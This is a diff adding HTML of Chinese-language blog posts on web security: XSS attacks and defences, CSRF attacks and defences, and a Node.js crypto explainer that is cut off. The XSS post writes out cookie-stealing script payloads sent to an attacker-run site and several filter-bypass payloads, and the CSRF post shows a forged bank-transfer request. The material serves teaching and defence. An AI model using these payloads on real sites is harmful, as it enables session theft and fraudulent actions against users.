@@ -53,6 +53,272 @@
     <header>
       
         <div class="icon"></div>
+        <time datetime="2017-02-18T06:45:23.000Z"><a href="/2017/02/18/网络安全/XSS攻击及预防/">2017-02-18</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/02/18/网络安全/XSS攻击及预防/">XSS攻击及预防</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="XSS攻击是什么"><a href="#XSS攻击是什么" class="headerlink" title="XSS攻击是什么"></a>XSS攻击是什么</h2><ul>
+<li>XSS又称CSS，全称Cross SiteScript跨站脚本攻击的缩写，是一种网站应用程序的安全漏洞攻击，是代码注入的一种。</li>
+<li>通常是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。</li>
+<li>这些恶意网页程序通常是JavaScript，但实际上也可以包括Java，VBScript，ActiveX，Flash或者甚至是普通的HTML。</li>
+<li>攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、会话和盗取用户Cookie、破坏页面结构、重定向到其它网站等</li>
+</ul>
+<h3 id="XSS攻击基本原理——代码注入"><a href="#XSS攻击基本原理——代码注入" class="headerlink" title="XSS攻击基本原理——代码注入"></a>XSS攻击基本原理——代码注入</h3><p>在web的世界里有各种各样的语言，于是乎对于语句的解析大家各不相同，有一些语句在一种语言里是合法的，但是在另外一种语言里是非法的。这种二义性使得黑客可以用代码注入的方式进行攻击——将恶意代码注入合法代码里隐藏起来，再诱发恶意代码，从而进行各种各样的非法活动。只要破坏跨层协议的数据/指令的构造，我们就能攻击。<br>历史悠久的<code>SQL注入</code>和<code>XSS注入</code>都是这种攻击方式的典范。现如今，随着参数化查询的普及，我们已经离<code>SQL注入</code>很远了。但是，历史同样悠久的<code>XSS</code>却没有远离我们。<br><code>XSS</code>的基本实现思路很简单——比如<code>持久型XSS</code>通过一些正常的站内交互途径，例如发布评论，提交含有<code>JavaScript</code>的内容文本。这时服务器端如果没有过滤或转义掉这些脚本，作为内容发布到了页面上，其他用户访问这个页面的时候就会运行这些脚本，从而被攻击。</p>
+<p>攻击分类举例</p>
+<h3 id="DOM-based-XSS"><a href="#DOM-based-XSS" class="headerlink" title="DOM-based XSS"></a>DOM-based XSS</h3><p>基于DOM的XSS，通过对具体DOM代码进行分析，根据实际情况构造dom节点进行XSS跨站脚本攻击，该攻击特点是中招的人是少数人。<br><strong>场景一</strong>：<br>当我登录a.com后，我发现它的页面某些内容是根据url中的一个叫content参数直接显示的，猜测它测页面处理可能是这样，其它语言类似：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">%@</span> <span class="attr">page</span> <span class="attr">language</span>=<span class="string">"java"</span> <span class="attr">contentType</span>=<span class="string">"text/html; charset=UTF-8"</span> <span class="attr">pageEncoding</span>=<span class="string">"UTF-8"</span>%&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPEhtmlPUBLIC"-//W3C//DTD HTML 4.01 Transitional//EN""http://www.w3.org/TR/html4/loose.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS测试<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">   页面内容：<span class="tag">&lt;<span class="name">%=request.getParameter("content")%</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>我知道了Tom也注册了该网站，并且知道了他的邮箱(或者其它能接收信息的联系方式)，我做一个超链接发给他，超链接地址为：<a href="http://www.a.com?content=" target="_blank" rel="noopener">http://www.a.com?content=</a><script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，当Tom点击这个链接的时候(假设他已经登录a.com)，浏览器就会直接打开b.com，并且把Tom在a.com中的cookie信息发送到b.com，b.com是我搭建的网站，当我的网站接收到该信息时，我就盗取了Tom在a.com的cookie信息，cookie信息中可能存有登录密码，攻击成功！这个过程中，受害者只有Tom自己。那当我在浏览器输入a.com?content=<script>alert(“xss”)</script>，浏览器展示页面内容的过程中，就会执行我的脚本，页面输出xss字样，这是攻击了我自己，那我如何攻击别人并且获利呢？</p>
+<h3 id="持久型XSS"><a href="#持久型XSS" class="headerlink" title="持久型XSS"></a>持久型XSS</h3><p>也叫存储型XSS——主动提交恶意数据到服务器，攻击者在数据中嵌入代码，这样当其他用户请求后，服务器从数据库中查询数据并发给用户，用户浏览此类页面时就可能受到攻击。由于其攻击代码已经存储到服务器上或者数据库中，所以受害者是很多人。可以描述为:恶意用户的HTML或JS输入服务器-&gt;进入数据库-&gt;服务器响应时查询数据库-&gt;用户浏览器。</p>
+<p><strong>场景二</strong>：<br>a.com可以发文章，我登录后在a.com中发布了一篇文章，文章中包含了恶意代码，<script>window.open(“<a href="http://www.b.com?param=”+document.cookie">www.b.com?param=”+document.cookie</a>)</script>，保存文章。这时Tom和Jack看到了我发布的文章，当在查看我的文章时就都中招了，他们的cookie信息都发送到了我的服务器上，攻击成功！这个过程中，受害者是多个人。Stored XSS漏洞危害性更大，危害面更广。</p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射性XSS，也就是被动的非持久性XSS。诱骗用户点击URL带攻击代码的链接，服务器解析后响应，在返回的响应内容中隐藏和嵌入攻击者的XSS代码，被浏览器执行，从而攻击用户。<br>URL可能被用户怀疑，但是可以通过短网址服务将之缩短，从而隐藏自己。</p>
+<h3 id="使用XSS-Filter"><a href="#使用XSS-Filter" class="headerlink" title="使用XSS Filter"></a>使用XSS Filter</h3><ul>
+<li><p>输入过滤，所有用户输入都是不可信的。”（注意: 攻击代码不一定在<script></script>中），对用户提交的数据进行有效性验证，仅接受指定长度范围内并符合我们期望格式的的内容提交，阻止或者忽略除此外的其他任何数据。</p>
+<p>| less-than character (&lt;)                                      | &lt;                                                     |<br>| ———————————————————— | ——————————————————– |<br>| greater-than character (&gt;)                                   | &gt;                                                     |<br>| ampersand character (&amp;)                                      | &amp;                                                    |<br>| double-quote character (“)                                   | &quot;                                                   |<br>| space character( )                                           | &nbsp;                                                   |<br>| Any ASCII code character whose code is greater-than or equal to 0x80 | &amp;#<number>, where <number> is the ASCII character value. |</number></number></p>
+</li>
+</ul>
+<p>比如用户输入：<script>window.location.href=”<a href="http://www.baidu.com”">http://www.baidu.com”</a>;</script>，保存后最终存储的会是&lt;script&gt;window.location.href=&quot;<a href="http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。" target="_blank" rel="noopener">http://www.baidu.com&quot;&lt;/script&gt;在展现时浏览器会对这些字符转换成文本内容显示，而不是一段可执行的代码。</a></p>
+<ul>
+<li>输出转义，当需要将一个字符串输出到Web网页时，同时又不确定这个字符串中是否包括XSS特殊字符，为了确保输出内容的完整性和正确性，输出HTML属性时可以使用HTML转义编码（HTMLEncode）进行处理，输出到<script>中，可以进行JS编码。</li>
+</ul>
+<h3 id="使用-HttpOnly-Cookie"><a href="#使用-HttpOnly-Cookie" class="headerlink" title="使用 HttpOnly Cookie"></a>使用 HttpOnly Cookie</h3><p>将重要的cookie标记为httponly，这样的话当浏览器向Web服务器发起请求的时就会带上<code>cookie</code>字段，但是在<code>js</code>脚本中却不能访问这个cookie，这样就避免了XSS攻击利用<code>JavaScript</code>的<code>document.cookie</code>获取<code>cookie</code>。</p>
+<h3 id="CSP策略"><a href="#CSP策略" class="headerlink" title="CSP策略"></a>CSP策略</h3><p>单篇说</p>
+<h3 id="困难和幸运"><a href="#困难和幸运" class="headerlink" title="困难和幸运"></a>困难和幸运</h3><p>过滤 Html 标签能否防止 XSS? 请列举不能的情况?</p>
+<p>用户除了上传</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;xss&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以使用图片 url 等方式来上传脚本进行攻击</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;table background=&quot;javascript:alert(/xss/)&quot;&gt;&lt;/table&gt;</span><br><span class="line">&lt;img src=&quot;javascript:alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以使用各种方式来回避检查, 例如空格, 回车, Tab</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;javas cript:</span><br><span class="line">alert(&apos;xss&apos;)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>还可以通过各种编码转换 (URL 编码, Unicode 编码, HTML 编码, ESCAPE 等) 来绕过检查</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img%20src=%22javascript:alert(&apos;xss&apos;);%22&gt;</span><br><span class="line">&lt;img src=&quot;javascrip&amp;#116&amp;#58alert(/xss/)&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>真正麻烦的是，在一些场合我们要允许用户输入HTML，又要过滤其中的脚本。这就要求我们对代码小心地进行转义。否则，我们可能既获取不了用户的正确输入，又被XSS攻击。<br>幸好，由于XSS臭名昭著历史悠久又极其危险，现代web开发框架如<code>vue.js</code>、<code>react.js</code>等，在设计的时候就考虑了XSS攻击对html插值进行了更进一步的抽象、过滤和转义，我们只要熟练正确地使用他们，就可以在大部分情况下避免XSS攻击。<br>同时，许多基于<code>MVVM</code>框架的<code>SPA</code>（单页应用）不需要刷新URL来控制view，这样大大防止了XSS隐患。另外，我们还可以用一些防火墙来阻止XSS的运行。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.csdn.net/ghsau/article/details/17027893">https://blog.csdn.net/ghsau/article/details/17027893</a></p>
+<p><a href="https://www.imooc.com/article/13553">https://www.imooc.com/article/13553</a></p>
+<p><a href="https://blog.csdn.net/u011781521/article/details/53894399">https://blog.csdn.net/u011781521/article/details/53894399</a></p>
+<p><a href="https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss">https://elemefe.github.io/node-interview/#/sections/zh-cn/security?id=xss</a></p>
+</script></li></ul>
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-02-16T06:45:23.000Z"><a href="/2017/02/16/网络安全/CSRF攻击及预防/">2017-02-16</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/02/16/网络安全/CSRF攻击及预防/">CSRF攻击及预防</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="什么是CSRF？"><a href="#什么是CSRF？" class="headerlink" title="什么是CSRF？"></a>什么是CSRF？</h2><p>CSRF（Cross-Site Request Forgery，跨站点伪造请求，也被称为：one click attack/session riding，缩写为：CSRF/XSRF）是一种网络攻击方式，该攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在未授权的情况下执行在权限保护之下的操作，具有很大的危害性。具体来讲，可以这样理解CSRF攻击：攻击者盗用了你的身份，以你的名义发送恶意请求，对服务器来说这个请求是完全合法的，但是却完成了攻击者所期望的一个操作，比如以你的名义发送邮件、发消息，盗取你的账号，添加系统管理员，甚至于购买商品、虚拟货币转账等。</p>
+<h2 id="CSRF原理"><a href="#CSRF原理" class="headerlink" title="CSRF原理"></a>CSRF原理</h2><p>下图简单阐述了CSRF的原理:</p>
+<p><img src="http://7xq1il.com1.z0.glb.clouddn.com/csrf.jpg" alt=""></p>
+<p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成以下两个步骤：</p>
+<ul>
+<li>登录受信任网站A，并在本地生成Cookie。</li>
+<li>在不登出A的情况下，访问危险网站B。</li>
+</ul>
+<p>看到这里，你也许会问：“如果我不满足以上两个条件中的一个，我就不会受到CSRF攻击”。是滴，确实如此，但是你不能保证以下情况不会发生：</p>
+<ul>
+<li>你不能保证你登录了一个网站之后，不再打开一个tab页面并访问其它的网站。</li>
+<li>你不能保证你关闭浏览器之后，你本地的Cookie立刻过期，你上次的会话已经结束。</li>
+<li>上述中所谓的攻击网站，可能就是一个钓鱼网站。</li>
+</ul>
+<h2 id="CSRF攻击实例"><a href="#CSRF攻击实例" class="headerlink" title="CSRF攻击实例"></a>CSRF攻击实例</h2><p>CSRF 攻击可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击站点，从而在并未授权的情况下执行在权限保护之下的操作。比如说，受害者 Bob 在银行有一笔存款，通过对银行的网站发送请求 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=bob2</a> 可以使 Bob 把 1000000 的存款转到 bob2 的账号下。通常情况下，该请求发送到网站后，服务器会先验证该请求是否来自一个合法的 session，并且该 session 的用户 Bob 已经成功登陆。黑客 Mallory 自己在该银行也有账户，他知道上文中的 URL 可以把钱进行转帐操作。Mallory 可以自己发送一个请求给银行：<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory。但是这个请求来自</a> Mallory 而非 Bob，他不能通过安全认证，因此该请求不会起作用。这时，Mallory 想到使用 CSRF 的攻击方式，他先自己做一个网站，在网站中放入如下代码： src=”<a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory</a> ”，并且通过广告等诱使 Bob 来访问他的网站。当 Bob 访问该网站时，上述 url 就会从 Bob 的浏览器发向银行，而这个请求会附带 Bob 浏览器中的 cookie 一起发向银行服务器。大多数情况下，该请求会失败，因为他要求 Bob 的认证信息。但是，如果 Bob 当时恰巧刚访问他的银行后不久，他的浏览器与银行网站之间的 session 尚未过期，浏览器的 cookie 之中含有 Bob 的认证信息。这时，悲剧发生了，这个 url 请求就会得到响应，钱将从 Bob 的账号转移到 Mallory 的账号，而 Bob 当时毫不知情。等以后 Bob 发现账户钱少了，即使他去银行查询日志，他也只能发现确实有一个来自于他本人的合法请求转移了资金，没有任何被攻击的痕迹。而 Mallory 则可以拿到钱后逍遥法外。</p>
+<h2 id="CSRF如何防御"><a href="#CSRF如何防御" class="headerlink" title="CSRF如何防御"></a>CSRF如何防御</h2><h3 id="验证-HTTP-Referer-字段"><a href="#验证-HTTP-Referer-字段" class="headerlink" title="验证 HTTP Referer 字段"></a>验证 HTTP Referer 字段</h3><p>根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。在通常情况下，访问一个安全受限页面的请求来自于同一个网站，比如需要访问 <a href="http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆" target="_blank" rel="noopener">http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Mallory，用户必须先登陆</a> bank.example，然后通过点击页面上的按钮来触发转账事件。这时，该转帐请求的 Referer 值就会是转账按钮所在的页面的 URL，通常是以 bank.example 域名开头的地址。而如果黑客要对银行网站实施 CSRF 攻击，他只能在他自己的网站构造请求，当用户通过黑客的网站发送请求到银行时，该请求的 Referer 是指向黑客自己的网站。因此，要防御 CSRF 攻击，银行网站只需要对于每一个转账请求验证其 Referer 值，如果是以 bank.example 开头的域名，则说明该请求是来自银行网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是黑客的 CSRF 攻击，拒绝该请求。</p>
+<p>这种方法的显而易见的好处就是简单易行，网站的普通开发人员不需要操心 CSRF 的漏洞，只需要在最后给所有安全敏感的请求统一增加一个拦截器来检查 Referer 的值就可以。特别是对于当前现有的系统，不需要改变当前系统的任何已有代码和逻辑，没有风险，非常便捷。</p>
+<p>然而，这种方法并非万无一失。Referer 的值是由浏览器提供的，虽然 HTTP 协议上有明确的要求，但是每个浏览器对于 Referer 的具体实现可能有差别，并不能保证浏览器自身没有安全漏洞。使用验证 Referer 值的方法，就是把安全性都依赖于第三方（即浏览器）来保障，从理论上来讲，这样并不安全。事实上，对于某些浏览器，比如 IE6 或 FF2，目前已经有一些方法可以篡改 Referer 值。如果 bank.example 网站支持 IE6 浏览器，黑客完全可以把用户浏览器的 Referer 值设为以 bank.example 域名开头的地址，这样就可以通过验证，从而进行 CSRF 攻击。</p>
+<p>即便是使用最新的浏览器，黑客无法篡改 Referer 值，这种方法仍然有问题。因为 Referer 值会记录下用户的访问来源，有些用户认为这样会侵犯到他们自己的隐私权，特别是有些组织担心 Referer 值会把组织内网中的某些信息泄露到外网中。因此，用户自己可以设置浏览器使其在发送请求时不再提供 Referer。当他们正常访问银行网站时，网站会因为请求没有 Referer 值而认为是 CSRF 攻击，拒绝合法用户的访问。</p>
+<h3 id="添加token验证"><a href="#添加token验证" class="headerlink" title="添加token验证"></a>添加token验证</h3><p>CSRF攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都存在cookie中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的cookie来通过安全验证。要防止CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于cookie之中。可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器建立一个拦截器来验证这个token，如果请求中没有token或者token不正确，则认为可能是CSRF攻击而拒绝该请求。<br> 现在业界一致的做法就是使用Anti CSRF Token来防御CSRF。</p>
+<ul>
+<li>用户访问某个表单页面。</li>
+<li>服务端生成一个Token，放在用户的Session中，或者浏览器的Cookie中。</li>
+<li>在页面表单附带上Token参数。</li>
+<li>用户提交请求后，服务端验证表单中的Token是否与用户Session（或Cookies）中的Token一致，一致为合法请求，不是则非法请求。</li>
+</ul>
+<p>这个Token值必须是随机的，不可预测的。由于Token的存在，攻击者无法再构造一个带有合法Token的请求实施CSRF攻击。另外使用Token应注意Token的保密性，尽量把敏感操作由GET改成POST，以form或者AJAX形式提交，避免Token泄露。</p>
+<h3 id="验证码"><a href="#验证码" class="headerlink" title="验证码"></a>验证码</h3><p>验证码，强制用户必须与应用进行交互，才能完成最终请求。通常情况下，验证码能够很好的遏制CSRF攻击。但是出于用户体验考虑，网站不能给所有的操作都加上验证码。因此验证码只能作为一种辅助手段。</p>
+<h3 id="尽量使用POST，限制GET"><a href="#尽量使用POST，限制GET" class="headerlink" title="尽量使用POST，限制GET"></a>尽量使用POST，限制GET</h3><p>GET接口能够直接将请求地址暴露给攻击者，所以要防止CSRF一定最好不要用GET。当然POST并不是万无一失，攻击者只需要构造一个form表单就可以，但需要在第三方页面做，这样就增加了暴露的可能性。</p>
+<h3 id="在HTTP头部添加自定义属性"><a href="#在HTTP头部添加自定义属性" class="headerlink" title="在HTTP头部添加自定义属性"></a>在HTTP头部添加自定义属性</h3><p>这种方法也是使用token并验证，但是它是把token放在HTTP请求头部中。通过使用AJAX我们可以在我们的请求头部中添加我们的自定义属性，但是这种方法要求我们将整个站的请求全部改成AJAX，如果是新站还好，老站的话无疑是需要重写整个站点的，这是很不可取的。</p>
+<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/cxying93/p/6035031.html" target="_blank" rel="noopener">https://www.cnblogs.com/cxying93/p/6035031.html</a><br><a href="https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html" target="_blank" rel="noopener">https://www.ibm.com/developerworks/cn/web/1102_niugang_csrf/index.html</a><br><a href="https://www.imooc.com/article/18069" target="_blank" rel="noopener">https://www.imooc.com/article/18069</a></p>
+
+      
+    </div>
+    <footer>
+      
+        
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+
+
+  <article class="post">
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2017-02-12T06:45:23.000Z"><a href="/2017/02/12/网络安全/Node.js中crypto模块/">2017-02-12</a></time>
+      
+      
+  
+    <h1 class="title"><a href="/2017/02/12/网络安全/Node.js中crypto模块/">Node.js中的crypto模块</a></h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <h2 id="一、-概述"><a href="#一、-概述" class="headerlink" title="一、 概述"></a>一、 概述</h2><p>互联网时代，网络上的数据量每天都在以惊人的速度增长。同时，各类网络安全问题层出不穷。在信息安全重要性日益凸显的今天，作为一名开发者，需要加强对安全的认识，并通过技术手段增强服务的安全性。</p>
+<p><code>crypto</code>模块是nodejs的核心模块之一，它提供了安全相关的功能，如摘要运算、加密、电子签名等。很多初学者对着长长的API列表，不知如何上手，因此它背后涉及了大量安全领域的知识。</p>
+<p>本文重点讲解API背后的理论知识，主要包括如下内容：</p>
+<ol>
+<li>摘要（hash）、基于摘要的消息验证码（HMAC）</li>
+<li>对称加密、非对称加密、电子签名</li>
+<li>分组加密模式</li>
+</ol>
+<h2 id="二、摘要（hash）"><a href="#二、摘要（hash）" class="headerlink" title="二、摘要（hash）"></a>二、摘要（hash）</h2><p>摘要（digest）：将长度不固定的消息作为输入，通过运行hash函数，生成固定长度的输出，这段输出就叫做摘要。通常用来验证消息完整、未被篡改。</p>
+<p>摘要运算是不可逆的。也就是说，输入固定的情况下，产生固定的输出。但知道输出的情况下，无法反推出输入。</p>
+<p>伪代码如下。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">digest = Hash(message)</span><br></pre></td></tr></table></figure></p>
+<p>常见的摘要算法 与 对应的输出位数如下：</p>
+<ul>
+<li>MD5：128位</li>
+<li>SHA-1：160位</li>
+<li>SHA256 ：256位</li>
+<li>SHA512：512位</li>
+</ul>
+<p>nodejs中的例子：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"><span class="keyword">var</span> md5 = crypto.createHash(<span class="string">'md5'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> message = <span class="string">'hello'</span>;</span><br><span class="line"><span class="keyword">var</span> digest = md5.update(message, <span class="string">'utf8'</span>).digest(<span class="string">'hex'</span>); </span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(digest);</span><br><span class="line"><span class="comment">// 输出如下：注意这里是16进制</span></span><br><span class="line"><span class="comment">// 5d41402abc4b2a76b9719d911017c592</span></span><br></pre></td></tr></table></figure>
+<p>备注：在各类文章或文献中，摘要、hash、散列 这几个词经常会混用，导致不少初学者看了一脸懵逼，其实大部分时候指的都是一回事，记住上面对摘要的定义就好了。</p>
+<h2 id="三、MAC、HMAC"><a href="#三、MAC、HMAC" class="headerlink" title="三、MAC、HMAC"></a>三、MAC、HMAC</h2><p>MAC（Message Authentication Code）：消息认证码，用以保证数据的完整性。运算结果取决于消息本身、秘钥。</p>
+<p>MAC可以有多种不同的实现方式，比如HMAC。</p>
+<p>HMAC（Hash-based Message Authentication Code）：可以粗略地理解为带秘钥的hash函数。</p>
+<p>nodejs例子如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 参数一：摘要函数</span></span><br><span class="line"><span class="comment">// 参数二：秘钥</span></span><br><span class="line"><span class="keyword">let</span> hmac = crypto.createHmac(<span class="string">'md5'</span>, <span class="string">'123456'</span>);</span><br><span class="line"><span class="keyword">let</span> ret = hmac.update(<span class="string">'hello'</span>).digest(<span class="string">'hex'</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(ret);</span><br><span class="line"><span class="comment">// 9c699d7af73a49247a239cb0dd2f8139</span></span><br></pre></td></tr></table></figure>
+<h2 id="四、对称加密、非对称加密"><a href="#四、对称加密、非对称加密" class="headerlink" title="四、对称加密、非对称加密"></a>四、对称加密、非对称加密</h2><p><strong>加密/解密</strong>：给定明文，通过一定的算法，产生加密后的密文，这个过程叫加密。反过来就是解密。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt( plainText )</span><br><span class="line">plainText = decrypt( encryptedText )</span><br></pre></td></tr></table></figure></p>
+<p><strong>秘钥</strong>：为了进一步增强加/解密算法的安全性，在加/解密的过程中引入了秘钥。秘钥可以视为加/解密算法的参数，在已知密文的情况下，如果不知道解密所用的秘钥，则无法将密文解开。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, encryptKey)</span><br><span class="line">plainText = decrypt(encryptedText, decryptKey)</span><br></pre></td></tr></table></figure></p>
+<p>根据加密、解密所用的秘钥是否相同，可以将加密算法分为<strong>对称加密</strong>、<strong>非对称加密</strong>。</p>
+<h3 id="1、对称加密"><a href="#1、对称加密" class="headerlink" title="1、对称加密"></a>1、对称加密</h3><p>加密、解密所用的秘钥是相同的，即<code>encryptKey === decryptKey</code>。</p>
+<p>常见的对称加密算法：DES、3DES、AES、Blowfish、RC5、IDEA。</p>
+<p>加、解密伪代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, key); <span class="comment">// 加密</span></span><br><span class="line">plainText = decrypt(encryptedText, key); <span class="comment">// 解密</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2、非对称加密"><a href="#2、非对称加密" class="headerlink" title="2、非对称加密"></a>2、非对称加密</h3><p>又称公开秘钥加密。加密、解密所用的秘钥是不同的，即<code>encryptKey !== decryptKey</code>。</p>
+<p>加密秘钥公开，称为公钥。解密秘钥保密，称为秘钥。</p>
+<p>常见的非对称加密算法：RSA、DSA、ElGamal。</p>
+<p>加、解密伪代码：<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encryptedText = encrypt(plainText, publicKey);  <span class="comment">// 加密</span></span><br><span class="line">plainText = decrypt(encryptedText, priviteKey); <span class="comment">// 解密</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="3、对比与应用"><a href="#3、对比与应用" class="headerlink" title="3、对比与应用"></a>3、对比与应用</h3><p>除了秘钥的差异，还有运算速度上的差异。通常来说：</p>
+<ol>
+<li>对称加密速度要快于非对称加密。</li>
+<li>非对称加密通常用于加密短文本，对称加密通常用于加密长文本。</li>
+</ol>
+<p>两者可以结合起来使用，比如HTTPS协议，可以在握手阶段，通过RSA来交换生成对称秘钥。在之后的通讯阶段，可以使用对称加密算法对数据进行加密，秘钥则是握手阶段生成的。 </p>
+<p>备注：对称秘钥交换不一定通过RSA，还可以通过类似DH来完成，这里不展开。</p>
+<h2 id="五、数字签名"><a href="#五、数字签名" class="headerlink" title="五、数字签名"></a>五、数字签名</h2><p>从<strong>签名</strong>大致可以猜到<strong>数字签名</strong>的用途。主要作用如下：</p>
+<ol>
+<li>确认信息来源于特定的主体。</li>
+<li>确认信息完整、未被篡改。</li>
+</ol>
+<p>为了达到上述目的，需要有两个过程：</p>
+<ol>
+<li>发送方：生成签名。</li>
+<li>接收方：验证签名。</li>
+</ol>
+<h3 id="1、发送方生成签名"><a href="#1、发送方生成签名" class="headerlink" title="1、发送方生成签名"></a>1、发送方生成签名</h3><ol>
+<li>计算原始信息的摘要。</li>
+<li>通过私钥对摘要进行签名，得到电子签名。</li>
+<li>将原始信息、电子签名，发送给接收方。</li>
+</ol>
+<p>附：签名伪代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">digest = hash(message); <span class="comment">// 计算摘要</span></span><br><span class="line">digitalSignature = sign(digest,  priviteKey); <span class="comment">// 计算数字签名</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="2、接收方验证签名"><a href="#2、接收方验证签名" class="headerlink" title="2、接收方验证签名"></a>2、接收方验证签名</h3><ol>
+<li>通过公钥解开电子签名，得到摘要D1。（如果解不开，信息来源主体校验失败）</li>
+<li>计算原始信息的摘要D2。</li>
